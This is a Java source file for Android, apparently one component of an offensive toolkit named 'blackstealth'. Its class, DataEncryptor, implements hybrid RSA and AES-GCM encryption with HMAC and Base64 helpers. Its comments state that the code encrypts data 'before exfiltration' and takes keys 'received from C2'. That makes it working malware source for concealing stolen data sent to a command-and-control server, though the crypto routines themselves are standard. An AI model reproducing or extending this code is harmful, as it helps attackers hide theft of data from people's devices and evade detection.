package com.offensive.blackstealth.gathering;

import android.util.Base64;
import java.security.*;
import java.security.spec.*;
import javax.crypto.*;
import javax.crypto.spec.*;

/**
 * DataEncryptor - Encrypts data before exfiltration
 */
public class DataEncryptor {
    private static final String AES_MODE = "AES/GCM/NoPadding";
    private static final String RSA_MODE = "RSA/ECB/PKCS1Padding";
    private static final int GCM_TAG_LENGTH = 128;
    private static final int AES_KEY_SIZE = 256;
    
    private SecretKey aesKey;
    private PublicKey rsaPublicKey;
    private SecureRandom random;
    
    public DataEncryptor() {
        this.random = new SecureRandom();
        generateAesKey();
    }
    
    public DataEncryptor(String base64PublicKey) {
        this();
        setRsaPublicKey(base64PublicKey);
    }
    
    /**
     * Generate a new AES key
     */
    public void generateAesKey() {
        try {
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(AES_KEY_SIZE, random);
            this.aesKey = keyGen.generateKey();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("AES not available", e);
        }
    }
    
    /**
     * Set RSA public key for key exchange
     */
    public void setRsaPublicKey(String base64Key) {
        try {
            byte[] keyBytes = Base64.decode(base64Key, Base64.DEFAULT);
            X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
            KeyFactory factory = KeyFactory.getInstance("RSA");
            this.rsaPublicKey = factory.generatePublic(spec);
        } catch (Exception e) {
            throw new RuntimeException("Invalid RSA key", e);
        }
    }
    
    /**
     * Encrypt data with AES-GCM
     */
    public byte[] encryptAes(byte[] plaintext) throws Exception {
        byte[] iv = new byte[12];
        random.nextBytes(iv);
        
        Cipher cipher = Cipher.getInstance(AES_MODE);
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, spec);
        
        byte[] ciphertext = cipher.doFinal(plaintext);
        
        // Prepend IV to ciphertext
        byte[] result = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
        
        return result;
    }
    
    /**
     * Decrypt AES-GCM encrypted data
     */
    public byte[] decryptAes(byte[] ciphertext) throws Exception {
        byte[] iv = new byte[12];
        System.arraycopy(ciphertext, 0, iv, 0, 12);
        
        Cipher cipher = Cipher.getInstance(AES_MODE);
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.DECRYPT_MODE, aesKey, spec);
        
        return cipher.doFinal(ciphertext, 12, ciphertext.length - 12);
    }
    
    /**
     * Encrypt AES key with RSA for secure key exchange
     */
    public byte[] encryptAesKeyWithRsa() throws Exception {
        if (rsaPublicKey == null) {
            throw new IllegalStateException("RSA public key not set");
        }
        
        Cipher cipher = Cipher.getInstance(RSA_MODE);
        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey);
        return cipher.doFinal(aesKey.getEncoded());
    }
    
    /**
     * Encrypt data with hybrid encryption (RSA + AES)
     */
    public byte[] encryptHybrid(byte[] plaintext) throws Exception {
        byte[] encryptedKey = encryptAesKeyWithRsa();
        byte[] encryptedData = encryptAes(plaintext);
        
        // Format: [key_length(2)][encrypted_key][encrypted_data]
        byte[] result = new byte[2 + encryptedKey.length + encryptedData.length];
        result[0] = (byte) ((encryptedKey.length >> 8) & 0xFF);
        result[1] = (byte) (encryptedKey.length & 0xFF);
        System.arraycopy(encryptedKey, 0, result, 2, encryptedKey.length);
        System.arraycopy(encryptedData, 0, result, 2 + encryptedKey.length, encryptedData.length);
        
        return result;
    }
    
    /**
     * Compute HMAC for data integrity
     */
    public byte[] computeHmac(byte[] data) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(aesKey);
        return mac.doFinal(data);
    }
    
    /**
     * Hash data with SHA-256
     */
    public static byte[] sha256(byte[] data) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            return digest.digest(data);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("SHA-256 not available", e);
        }
    }
    
    /**
     * Encode data as Base64
     */
    public static String toBase64(byte[] data) {
        return Base64.encodeToString(data, Base64.NO_WRAP);
    }
    
    /**
     * Decode Base64 data
     */
    public static byte[] fromBase64(String data) {
        return Base64.decode(data, Base64.NO_WRAP);
    }
    
    /**
     * Get the current AES key (for key exchange)
     */
    public byte[] getAesKeyBytes() {
        return aesKey.getEncoded();
    }
    
    /**
     * Set AES key from bytes (received from C2)
     */
    public void setAesKey(byte[] keyBytes) {
        this.aesKey = new SecretKeySpec(keyBytes, "AES");
    }
}
